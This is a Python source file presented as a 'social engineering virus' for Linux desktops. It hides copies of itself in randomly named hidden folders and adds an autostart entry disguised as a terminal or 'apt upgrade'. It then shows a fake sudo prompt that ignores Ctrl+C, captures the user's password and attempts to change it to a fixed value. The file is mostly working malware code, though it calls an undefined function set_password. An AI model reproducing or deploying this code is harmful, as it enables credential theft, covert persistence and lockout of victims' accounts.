#!/bin/python3

#Simple Social Engineering Virus

#Importing modules
import getpass #For Getting password
import os #To perform os level operations
import sys #To get args
import time #to sleep during phishing
import subprocess #To perform operations on side
import random #To generate a place and a name for that place for our script



def dirgenerator():

    global hideuin
    crteddirs = [] #To storing the Created dirs

    paths = [] #For Storing the paths
    names = ["gnome-gtk", "gnome-terms", "gnome-greeter", "gnome-desk"] #Non suspicious names for folders to save the script inside
    
    #By Blacklisting these names there is a chance people wont notice easily
    blacklist = ["Desktop", "Downloads", "Documents","..",
                 "Music", "Pictures", "Public", "Templates", "Videos","."] 
    
    chars = "4BCD3F9H1JKLMN0PQR5TUVWXYZbcdfhjklmnpqrtuvwxyz"
    dirs = []
    ######## ------- ########
    # Another wat to find   #
    # directory list inside #
    #       Home            #
    ######## ------- ########

    # for i in paths:
    #     if pathlib.Path(i).is_dir()==True:
    #         print("foldrer:",i)
    #         continue

    #     elif (pathlib.Path(i).is_dir() == False) or (pathlib.Path(i).is_file() == True):
    #         print(os.path.isdir(i))
    #         try:
    #             print("removing",i)
    #             paths.remove(i)
    #         except ValueError:
    #             continue

    #To get the directory names. This is to show that we can get directory also in this way.

    #Here we are getting the first column of the ls -al command to check if it starts with d.
    chklst = subprocess.check_output(
        "ls -al /home/"+getpass.getuser()+"/ | awk '{print$1}'", shell=True).decode().strip()

    #here we are storing the list of directories found    
    ls = subprocess.check_output(
        "ls -al /home/"+getpass.getuser()+"/ | awk '{print$9}'", shell=True).decode().strip()
    
    # ls=os.listdir(f"/home/{getpass.getuser()}/") <= This is a easy way to get that list but thats not helping that much

    #Spliting the list,removing files and blacklisting common names
    ls = ls.split("\n")
    chklst = chklst.split("\n")
    chklst.remove("total")
    for i, j in enumerate(chklst):
        if j.startswith("d"):
            if ls[i] in blacklist:
                try:
                    paths.remove(i)
                    continue
                except:
                    continue
            paths.append(f"/home/{getpass.getuser()}/{ls[i]}")

    #For Generating random names for creating dirs for storing This script code
    for j in range(20):
        dirname = ""
        for i in range(9):#change this number to change the number of characters used in createing the directory name.
            dirname += random.choice(chars)
        dirs.append(dirname)

    #Creating and choosing random directories for storing this script
    hideuin = random.choice(paths)+"/."+random.choice(names)
#    hideuin = "/home/"+getpass.getuser()+"/."+random.choice(names)

    os.system(f"mkdir {hideuin}")
    for i in range(12):#change this number to create multiple folders in which we can store our script.
        crtdir = "mkdir "+hideuin+"/"+dirs[i]
        os.system(crtdir)
        crteddirs.append(dirs[i])
    # creating a folders to store our sctipt
    newfileloc = hideuin+"/"+random.choice(crteddirs)+"/."+random.choice(names)
    os.system(f"mkdir {newfileloc}")
    newfileloc = newfileloc+"/"+random.choice(crteddirs)
    os.system(f"mkdir {newfileloc}")
#    print(newfileloc) -> remove the # if you wanna see where the script hides itself 
    return newfileloc+"/"+"updater.py"







#With This Function We can change the password
#This Usually Changes the password to d4redevil
#This can only work if the password is phished and the Phished Password is a correct password.

######## ------- ########
#   Idea to Cause real  #
#        Mess           #
######## ------- ########

#Consider A really random generated password.

#### ---- Solution ---- ####

#You can change the Password of any user when you are in root user.

def goodbyeuser(password):
    get_fucked=subprocess.Popen(f"sudo -S passwd {getpass.getuser()}",shell=True, stdin=subprocess.PIPE)    # Creating a subprocess and piping standard input to communicate with it.
    get_fucked.stdin.write(f'{password}\n'.encode())    # Writing encoded current password (Bytes) to the stdin. \n in the end is to indicate return (ENTER). 
    get_fucked.stdin.write('d4redevil\n'.encode())  # Writing encoded New password (Bytes) to the stdin. \n in the end is to indicate return (ENTER).
    get_fucked.stdin.write('d4redevil\n'.encode())  # Writing encoded New password (Bytes) again to the stdin. \n in the end is to indicate return (ENTER).
    get_fucked.stdin.flush() #Flushing the stdin
    time.sleep(1)
    get_fucked.terminate()
    get_fucked.kill()
    quit()




#This will get what attack we are gonna specify
try:
    Attack = sys.argv[1]
except IndexError:
    Attack = None


#if No parameter is given. Then it will infect the system.
if Attack == None:
    #Just to make the script to dont look suspicious while execution

    message = input("Notification Message: ")
    os.system(f"notify-send {message}")

    #getting location to hide the script
    newfileloc = dirgenerator()

    os.system(f"mkdir -p /home/{getpass.getuser()}/.config/autostart")

    #using touch command so that it wont distrub if the file already exist and also creates if it doesn't exist
    os.system("touch /home/{}/.config/autostart/gnome-terminal.desktop".
              format(getpass.getuser()))

    #Add our Script to the autostart Programms.
    with open("/home/{}/.config/autostart/gnome-terminal.desktop".format(getpass.getuser()), "w") as _:
        _.write(
            f'[Desktop Entry]\nType=Application\nExec=xterm -T "apt upgrade" -e \"bash -c \'python3 {newfileloc} R;bash\'"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[en_NG]=Terminal\nName=Terminal')
    
    #To hide our script, We are moving our sctipt to new location.
    os.system(f"mv '{__file__}' '{newfileloc}'")


#If R is specified as a argument we can start the attack
if Attack == "R":

    while True:
        
        # A never ending loop to get password. will not stop untill the victim exits from the terminal or entering password.
        
        #Algorithm used here:
#        1.if any exception occured in the process then continue the loop.#so it wont stop in keyboard interupt (i.e) CTRL+C or EOF Signal (i.e) CTRL+D 
#         1.getting password for the first time and storing it in pswd
#         2.sleep 2 second
#         3.printing error message as they entered a wrong password.(To make sure the password entered is right.)
#         4.getting password for the second time and storing it in pswd1
#         5.comparing the phished passwords pswd and pswd1
#         6.if both passwords are same Then pswd is choosen as the sudo password of vitim and quits ,else 7.
#         7.getting password for the third time and storing it in pswd2
#         8.if pswd2 is either equal to pswd or equal to pswd1 then pswd2 is choosen as the sudo password of vitim and quits ,else 9.
#         9.print the error message and quits


        try:
            pswd = getpass.getpass(
                "[su"+"do] "+"Pas"+"swo"+"rd for {}:".format(getpass.getuser()))
            time.sleep(2)
            print("Sorry, try again.")
            pswd1 = getpass.getpass(
                "[su"+"do] Pass"+"word for"+" {}:".format(getpass.getuser()))
            if pswd == pswd1:
                print(f"Your password is {pswd} ")
                os.system(f"notify-send 'You Got Phished' 'Your Password is Phished :P ... LOL ...  {pswd}'")
                set_password(pswd)
                quit()
            else:
                time.sleep(2)
                print("Sorry, try again.")
                pswd2 = getpass.getpass(
                    "[s"+"udo] P"+"asswo"+"rd for"+" {}:".format(getpass.getuser()))

                if pswd == pswd2 or pswd1 == pswd2:
                    print(f"Your password is {pswd2} ")
                    os.system(f"notify-send 'You Got Phished' 'Your Password is Phished :P ... LOL ...  {pswd2}'")
                    set_password(pswd2)
                    quit()

                time.sleep(2)
                print("s"+"udo: "+"3 incor"+"rect pas"+"swo"+"rd atte"+"mpts")
                break
        except:
            print()
            continue
